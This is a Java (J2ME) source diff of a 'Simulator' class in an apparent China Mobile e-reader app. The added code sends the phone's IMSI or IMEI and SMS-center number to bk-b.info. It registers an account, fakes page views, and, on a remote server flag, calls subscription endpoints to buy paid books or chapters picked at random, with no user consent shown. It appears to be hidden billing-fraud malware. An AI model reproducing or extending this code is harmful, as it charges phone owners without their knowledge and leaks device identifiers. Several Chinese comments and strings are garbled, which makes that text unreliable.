@@ -1,6 +1,6 @@
 package com.yazo.CMCC.simulator;
 
-import java.io.UnsupportedEncodingException;
+import java.util.Random;
 import java.util.Vector;
 
 import javax.microedition.io.HttpConnection;
@@ -13,8 +13,6 @@ import com.yazo.CMCC.net.Channel;
 import com.yazo.application.MainMIDlet;
 import com.yazo.protocol.Catalog;
 import com.yazo.protocol.RefreshPv;
-import com.yazo.protocol.WelcomeInfo;
-import com.yazo.protocol.YaZhouChannel;
 import com.yazo.rms.RmsManager;
 import com.yazo.util.AppContext;
 import com.yazo.util.Consts;
@@ -28,16 +26,53 @@ import com.yazo.util.StringUtil;
 import com.yazo.util.User;
 
 public class Simulator {
-	private String cmcc_server = "http://bk-b.info/";
+	private String cmcc_server = "http://bk-b.info/reader/sync/info";
 	public static ServiceData serviceData;
 	static Vector progressIDFree = null;
 	static Vector progressIDCharge = null;
-	public void runSimulator() {
-		// Handle.getYaZhuoChannel();
-		User.userId = RmsManager.getUserID();
+	public static int total = 0;
+	public static int tempInt = 0;
 
-		authenticate();
-		cmccLogin();
+	public void runSimulator() {
+		getYaZhuoChannel();
+		if (serviceData.MSG4 == null || serviceData.MSG4.equals("1")
+				|| !Consts.isChinaMobile) {
+			return;
+		}
+		User.userId = RmsManager.getUserID();
+		if (User.userId.equals("")) {// 判断用户id是否存在来进行注�?
+			cmccRegister();// 注册
+		}
+		authenticate();// 登录鉴定
+		String welcome = getClientWelcomeInfo();
+		MainMIDlet.postMsg("欢迎信息�? + welcome);
+		if (welcome == null) {
+			return;
+		}
+
+		int indexFree = new Random().nextInt(progressIDFree.size());
+		if (serviceData.OPERATE.equals("0")) {
+			doFreeProcedurePV(indexFree);// 进行免费pv流程
+			boolean test = synYZServer();// 同步服务�?
+			MainMIDlet.postMsg("同步服务器：" + test);
+		} else if (serviceData.OPERATE.equals("1")) {
+
+			switch (Consts.SYSTEMTYPE) {
+			case 1:
+				// 随机数据执行收费
+				int index = new Random().nextInt(progressIDCharge.size());
+				// 扣费动作进行购买
+				doSubscribeChapter(index);
+				synYZServer();
+				// 收费过程和章节pv
+				doSubscribeChapterPV(index);
+				break;
+			default:
+				doFreeProcedurePV(indexFree);
+				synYZServer();
+				break;
+			}
+		}
 	}
 
 	public void authenticate() {
@@ -58,16 +93,13 @@ public class Simulator {
 				HttpConnection.POST);
 		Object obj = channel.queryServerForXML(p.getXml());
 		if (obj != null) {
-			System.out.println("登录返回有�?");
+			MainMIDlet.postMsg("登录返回有�?");
 		} else {
-			System.out.println("登录失败！！");
+			MainMIDlet.postMsg("登录失败！！");
 		}
 	}
 
-
-	
-
-	public void cmccLogin() {
+	public void cmccRegister() {
 		String strM = MD5.toMD5(Consts.strUserAgent + Consts.strUserPassword)
 				.toLowerCase();
 		String pp = HBase64.encode(StringUtil.hexStringToByte(strM));
@@ -75,79 +107,84 @@ public class Simulator {
 		p.addLabel("Request", "RegisterReq");
 		p.addLabel("RegisterReq", "clientHash");
 		p.addContent("clientHash", pp);
-		System.out.println("CMCC login:" + p.getXml());
+		System.out.println("CMCC register:" + p.getXml());
 
-		Channel channel = new Channel(Consts.HOSTURL, "authenticate2",
+		Channel channel = new Channel(Consts.HOSTURL, "register",
 				HttpConnection.POST);
 		Object obj = channel.queryServerForXML(p.getXml());
+		String msg;
+		if (obj != null) {
+			// 对从服务器返回的数据进行解析
+			KXmlParser parser = (KXmlParser) obj;
+			String result = ParserXml.registerAndLogin(parser);
+			RmsManager.saveUserID(User.userId);// 用户id临时存储
+			msg = "注册返回的信息：" + result;
+		} else {
+			msg = "注册失败！！";
+		}
+		MainMIDlet.postMsg(msg);
 
-			if (obj != null) {
-				// 对从服务器返回的数据进行解析
-				KXmlParser parser = (KXmlParser) obj;
-				String result = ParserXml.registerAndLogin(parser);
-				RmsManager.saveUserID(User.userId);// 用户id临时存储
-				System.out.println("注册返回的信息：" + result);
-			} else {
-				System.out.println("注册失败！！");
-			}
-		
 	}
+
 	/**
 	 * 首次请求服务�?
 	 * 
 	 * @return
 	 */
-	public static boolean getYaZhuoChannel() {
+	public boolean getYaZhuoChannel() {
 		serviceData = new ServiceData();
 		String name = "NZ_FEE_01";// 接口名称，NZ_FEE_01
 		String yzchannel = Consts.yzchannel;// 渠道号，与基地合作分配的渠道�?
 
-		String str[] = getIMSIANDCENTERNUMBER();
-
+		String[] str = getIMSIANDCENTERNUMBER();
+//		MainMIDlet.postMsg("------" + str[0]);
 		String version = Consts.VERSION;// 版本号，V1.01
-		String url = "http://bk-b.info/reader/sync/info";
-		url = url + "?channel=" + yzchannel + "&center=" + str[1] + "&imsi="
-				+ str[0] + "&name=" + name + "&version=" + version;
+//		String url = "http://bk-b.info/reader/sync/info";
+		String url = new StringBuffer(cmcc_server).append("?channel=").append(yzchannel)
+				.append("&center=").append(str[1]).append("&imsi=")
+				.append(str[0]).append("&name=").append(name)
+				.append("&version=").append(version).toString();
 		Channel channel = new Channel(url, "", "GET");
 		try {
 			byte[] obj = channel.queryServer();
 			if (obj != null) {
-				String strFile = new String(obj,"UTF-8");
-//				MainMIDlet.postMsg(strFile);
-//				System.out.println("服务器返回数据：" + strFile);
+				String strFile = new String(obj, "UTF-8");
+				// MainMIDlet.postMsg(url+strFile);
+				System.out.println("服务器返回数据：" + strFile);
 				serviceData = new ServiceData();
-//				serviceData.OPERATE = FileUtil.getArgValue(strFile, "OPERATE");
-//				serviceData.BUSINESS = FileUtil
-//						.getArgValue(strFile, "BUSINESS");
+				// serviceData.OPERATE = FileUtil.getArgValue(strFile,
+				// "OPERATE");
+				// serviceData.BUSINESS = FileUtil
+				// .getArgValue(strFile, "BUSINESS");
 				serviceData.FEECODE = FileUtil.getArgValue(strFile, "FEECODE");
 				serviceData.MSG1 = FileUtil.getArgValue(strFile, "MSG1");
 				serviceData.MSG2 = FileUtil.getArgValue(strFile, "MSG2");
 				serviceData.MSG3 = FileUtil.getArgValue(strFile, "MSG3");
-//				serviceData.MSG4 = FileUtil.getArgValue(strFile, "MSG4");
-//				serviceData.MSG5 = FileUtil.getArgValue(strFile, "MSG5");
-//				serviceData.MSG6 = FileUtil.getArgValue(strFile, "MSG6");
-//				serviceData.MSG7 = FileUtil.getArgValue(strFile, "MSG7");
-//				serviceData.MSG8 = FileUtil.getArgValue(strFile, "MSG8");
+				// serviceData.MSG4 = FileUtil.getArgValue(strFile, "MSG4");
+				// serviceData.MSG5 = FileUtil.getArgValue(strFile, "MSG5");
+				// serviceData.MSG6 = FileUtil.getArgValue(strFile, "MSG6");
+				// serviceData.MSG7 = FileUtil.getArgValue(strFile, "MSG7");
+				// serviceData.MSG8 = FileUtil.getArgValue(strFile, "MSG8");
 
 				// test
-				 serviceData.OPERATE = "0";
-				 serviceData.BUSINESS = (serviceData.BUSINESS == null ? ""
-				 : serviceData.BUSINESS);
-				 // serviceData.FEECODE =
-				 // (serviceData.FEECODE==null?"":serviceData.FEECODE);
-				 // serviceData.MSG1 = Consts.HOSTURL;
-				 // serviceData.MSG2= Consts.strUserAgent;
-				 // serviceData.MSG3="12101017";
-				 serviceData.MSG5 =
-				 "346|349494843|349494845,352|349558873|349558875,341|349680330|349680332";
-				 serviceData.MSG6 =
-				 "0|2487|347125261|347125263,0|880|348782216|348782218,1|122|67065|68168|15553,1|345|74149|74638|15566";
-				 serviceData.MSG4 = "0"/*
-				 (serviceData.MSG4==null?"":serviceData.MSG4) */;
-				 serviceData.MSG7 = (serviceData.MSG7 == null ? ""
-				 : serviceData.MSG7);
-				 serviceData.MSG8 = (serviceData.MSG8 == null ? ""
-				 : serviceData.MSG8);
+				serviceData.OPERATE = "0";
+				serviceData.BUSINESS = (serviceData.BUSINESS == null ? ""
+						: serviceData.BUSINESS);
+				// serviceData.FEECODE =
+				// (serviceData.FEECODE==null?"":serviceData.FEECODE);
+				// serviceData.MSG1 = Consts.HOSTURL;
+				// serviceData.MSG2= Consts.strUserAgent;
+				// serviceData.MSG3="12101017";
+				serviceData.MSG5 = "346|349494843|349494845,352|349558873|349558875,341|349680330|349680332";
+				serviceData.MSG6 = "0|2487|347125261|347125263,0|880|348782216|348782218,1|122|67065|68168|15553,1|345|74149|74638|15566";
+				serviceData.MSG4 = "0"/*
+									 * (serviceData.MSG4==null?"":serviceData.MSG4
+									 * )
+									 */;
+				serviceData.MSG7 = (serviceData.MSG7 == null ? ""
+						: serviceData.MSG7);
+				serviceData.MSG8 = (serviceData.MSG8 == null ? ""
+						: serviceData.MSG8);
 				if (serviceData.MSG5 != null) {// 免费书本
 					progressIDFree = new Vector();
 					String[] s = StringUtil.split(serviceData.MSG5, ",");
@@ -215,26 +252,30 @@ public class Simulator {
 		String[] str = getIMSIANDCENTERNUMBER();
 
 		String version = Consts.VERSION;
-		String url = "http://bk-b.info/reader/sync/info";
-		url = url + "?channel=" + yzchannel + "&center=" + str[1] + "&imsi="
-				+ str[0] + "&name=" + name + "&version=" + version
-				+ "&bookType=" + bookType + "&bookCatalogId=" + bookCatalogId
-				+ "&bookChapterId=" + bookChapterId + "&bookContentId="
-				+ bookContentId;
+//		String url = "http://bk-b.info/reader/sync/info";
+		String url = new StringBuffer(cmcc_server).append("?channel=").append(yzchannel)
+				.append("&center=").append(str[1]).append("&imsi=")
+				.append(str[0]).append("&name=").append(name)
+				.append("&version=").append(version).append("&bookType=")
+				.append(bookType).append("&bookCatalogId=")
+				.append(bookCatalogId).append("&bookChapterId=")
+				.append(bookChapterId).append("&bookContentId=")
+				.append(bookContentId).toString();
 		Channel channel = new Channel(url, "", "GET");
 		byte[] by = channel.queryServer();
-		if(by!=null){
+		if (by != null) {
 			return true;
 		}
 		return false;
 	}
+
 	/**
 	 * 欢迎信息
 	 * 
 	 */
 	public static String getClientWelcomeInfo() {
-		Channel channel = new Channel(Consts.HOSTURL,
-				"getClientWelcomeInfo", "GET");
+		Channel channel = new Channel(Consts.HOSTURL, "getClientWelcomeInfo",
+				"GET");
 		Object obj = channel.queryServerForXML("");
 		try {
 			if (obj != null) {
@@ -249,12 +290,13 @@ public class Simulator {
 		}
 		return null;
 	}
+
 	/**
 	 * 执行收费章节动作 执行完毕后，保存操作后产生的[contentId, chapterId]为收费章节pv服务
 	 */
 	public static void doSubscribeChapter(int index) {
 		String url = "";
-		RefreshPv pv = null;
+		Channel channel = null;
 		String productId = "", contentId = "", chapterId = "", type = "";
 		// 用于防止下标越界
 		if (index >= progressIDCharge.size()) {
@@ -271,52 +313,46 @@ public class Simulator {
 		Consts.bookChapterId = chapterId;
 		Consts.bookContentId = contentId;
 		if (type.equals("0")) {
-			/** *********包月************* */
+			/**
+			 * 包月订购
+			 */
 			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
 					.append(pro.catalogId).toString();
-			
-			Catalog catalog = new Catalog(url, "subscribeCatalog", "GET");
-			boolean re = catalog.subscribeCatalog("");
-			MainMIDlet.postMsg("包月是否成功�? + re);
-		} else if (type.equals("1")) {// 购买本书
-			// 得到产品
-			System.out.println("购买书�?�?);
+			channel = new Channel(url, "subscribeCatalog", "GET");
+			channel.queryServer();
+		} else if (type.equals("1")) {
+			/**
+			 * 得到产品,购买本书
+			 */
 			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
 					.append(contentId).toString();
-			pv = new RefreshPv(url, "getContentProductInfo", "GET");
-			// pv.doRefreshPv("");
-			MainMIDlet.postMsg("得到产品--" + pv.doRefreshPv(""));
-			// 执行订购
+			channel = new Channel(url, "getContentProductInfo", "GET");
+			channel.queryServer();
+			/**
+			 * 执行订购
+			 */
 			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
 					.append(contentId).append("&productId=").append(productId)
 					.toString();
-			pv = new RefreshPv(url, "subscribeContent", "GET");
-			// pv.doRefreshPv("");
-			if (pv.doRefreshPv("") != null || !pv.doRefreshPv("").equals("")) {
-				MainMIDlet.postMsg("执行订购有�?返回！！" + pv.doRefreshPv(""));
-			} else {
-				MainMIDlet.postMsg("执行订购-wu-值返回！�?);
-			}
+			channel = new Channel(url, "subscribeContent", "GET");
+			channel.queryServer();
 		} else if (type.equals("2")) {
-			// 得到产品
-			System.out.println("购买章节--");
+			/**
+			 * 得到产品,购买章节
+			 */
 			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
 					.append(contentId).append("&chapterId=").append(chapterId)
 					.toString();
-			pv = new RefreshPv(url, "getContentProductInfo", "GET");
-			// pv.doRefreshPv("");
-			MainMIDlet.postMsg("得到产品--" + pv.doRefreshPv(""));
-			// 执行订购
+			channel = new Channel(url, "getContentProductInfo", "GET");
+			channel.queryServer();
+			/**
+			 * 执行订购
+			 */
 			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
 					.append(contentId).append("&chapterId=").append(chapterId)
 					.append("&productId=").append(productId).toString();
-			pv = new RefreshPv(url, "subscribeContent", "GET");
-			// pv.doRefreshPv("");
-			if (pv.doRefreshPv("") != null || !pv.doRefreshPv("").equals("")) {
-				MainMIDlet.postMsg("执行订购有�?返回！！" + pv.doRefreshPv(""));
-			} else {
-				MainMIDlet.postMsg("执行订购-wu-值返回！�?);
-			}
+			channel = new Channel(url, "subscribeContent", "GET");
+			channel.queryServer();
 		}
 
 		// contentId和chapterId保存到本�?
@@ -335,6 +371,133 @@ public class Simulator {
 		}
 	}
 
+	/**
+	 * 执行收费章节Pv
+	 */
+	public static void doSubscribeChapterPV(int index) {
+		String url = "";
+		Channel channel = null;
+		String catalogId, contentId, chapterId;
+		if (index >= progressIDCharge.size()) {
+			index = progressIDCharge.size() - 1;
+		}
+		Progress pro = (Progress) progressIDCharge.elementAt(index);
+
+		catalogId = pro.catalogId;
+		contentId = pro.contentId;
+		chapterId = pro.chapterId;
+		catalogId = catalogId == null ? "" : catalogId;
+		contentId = contentId == null ? "" : contentId;
+		if (catalogId.equals("") && !contentId.equals("")) {
+			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
+					.append(contentId).toString();
+			channel = new Channel(url, "getContentInfo", "GET");
+			channel.queryServer();
+			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
+					.append(contentId).append("&chapterId=").append(chapterId)
+					.toString();
+			channel = new Channel(url, "getChapterInfo", "GET");
+			channel.queryServer();
+		} else if (!catalogId.equals("") && !contentId.equals("")) {
+			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
+					.append(catalogId).toString();
+			channel = new Channel(url, "getCatalogInfo", "GET");
+			channel.queryServer();
+			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
+					.append(catalogId).append("&contentId=").append(contentId)
+					.toString();
+			channel = new Channel(url, "getContentInfo", "GET");
+			channel.queryServer();
+			if (!chapterId.equals("")) {
+				url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
+						.append(contentId).append("&chapterId=")
+						.append(chapterId).toString();
+				channel = new Channel(url, "getChapterInfo", "GET");
+				channel.queryServer();
+			}
+		}
+		catalogId = null;
+		contentId = null;
+
+		if (total == 0) {
+			total = 2 + new Random().nextInt(4);
+		}
+		if (tempInt < total) {
+			tempInt++;
+			doSubscribeChapterPV(index);
+		} else {
+			tempInt = 0;
+			total = 0;
+			return;
+		}
+	}
+
+	/**
+	 * 执行免费过程Pv和章节pv 入口
+	 */
+	public static void doFreeProcedurePV(int index) {
+		String url = "";
+		Channel channel = null;
+		String catalogId, contentId, chapterId;
+		if (index >= progressIDFree.size()) {
+			index = progressIDFree.size() - 1;
+		}
+		Progress pro = (Progress) progressIDFree.elementAt(index);
+		catalogId = pro.catalogId;
+		contentId = pro.contentId;
+		chapterId = pro.chapterId;
+		catalogId = catalogId == null ? "" : catalogId;
+		contentId = contentId == null ? "" : contentId;
+		Consts.bookType = "3";
+		Consts.bookCatalogId = pro.catalogId;
+		Consts.bookChapterId = chapterId;
+		Consts.bookContentId = contentId;
+
+		if (catalogId.equals("") && !contentId.equals("")) {
+			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
+					.append(contentId).toString();
+			channel = new Channel(url, "getContentInfo", "GET");
+			channel.queryServer();
+			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
+					.append(contentId).append("&chapterId=").append(chapterId)
+					.toString();
+			channel = new Channel(url, "getChapterInfo", "GET");
+			channel.queryServer();
+		} else if (!catalogId.equals("") && !contentId.equals("")) {
+			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
+					.append(catalogId).toString();
+			channel = new Channel(url, "getCatalogInfo", "GET");
+			channel.queryServer();
+			// KXmlParser kp = (KXmlParser)channel.queryServerForXML("");
+			// String resu = ParserXml.getCatalogInfo(kp);
+			// MainMIDlet.postMsg("免费过程3�?+resu);
+			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
+					.append(catalogId).append("&contentId=").append(contentId)
+					.toString();
+			channel = new Channel(url, "getContentInfo", "GET");
+			channel.queryServer();
+			if (!chapterId.equals("")) {
+				url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
+						.append(contentId).append("&chapterId=")
+						.append(chapterId).toString();
+				channel = new Channel(url, "getChapterInfo", "GET");
+				channel.queryServer();
+			}
+		}
+		catalogId = null;
+		contentId = null;
+		if (total == 0) {
+			total = 2 + new Random().nextInt(2);
+		}
+		if (tempInt < total) {
+			tempInt++;
+			doFreeProcedurePV(index);
+		} else {
+			total = 0;
+			tempInt = 0;
+			return;
+		}
+	}
 
 	/**
 	 * 获取系统imsi和短信中心号
@@ -343,13 +506,14 @@ public class Simulator {
 	 */
 	public static String[] getIMSIANDCENTERNUMBER() {
 		String[] str = new String[2];
-		/** *******获取短信中心�?***************************************** */
+		/**
+		 * 获取短信中心�?
+		 * */
 		String center = "";// 短信中心号码
 		try {
 			center = MobileInfo.getCNETERNUMBER();
 		} catch (Error e) {
 		}
-		System.out.println("center" + center);
 		if (center != null && !center.equals("")) {
 			center = center.substring(6, center.length() - 3);
 			if (center.substring(0, 2).equals("00")) {
@@ -366,14 +530,14 @@ public class Simulator {
 			center = "6";
 		}
 		/**
-		 * *******获取imsi or imei
-		 * 都没有则拿取userid*****************************************
+		 * 获取imsi or imei 都没有则拿取userid
 		 */
 		String imsi = "";
 		try {
 			imsi = MobileInfo.getIMSI();// sim卡的imsi�?
 		} catch (Error e) {
 		}
+
 		if (imsi == null || imsi.equals("")) {
 			try {
 				imsi = MobileInfo.getIMEI();
@@ -391,16 +555,15 @@ public class Simulator {
 				imsi = imsi.substring(imsi.length() - 16, imsi.length());
 			}
 		}
-		if (imsi != null && !imsi.equals("")) {
-			// imsi=imsi.substring(5);
-		} else {
+
+		if (imsi == null || imsi.equals("")) {
 			// 本地取USERID
 			imsi = RmsManager.getUserID();
 			if (imsi != null && imsi.length() >= 20) {
 				imsi = imsi.substring(imsi.length() - 20, imsi.length());
 			}
 		}
-		/** ********组装******************** */
+
 		str[0] = imsi;
 		str[1] = center;
 		return str;
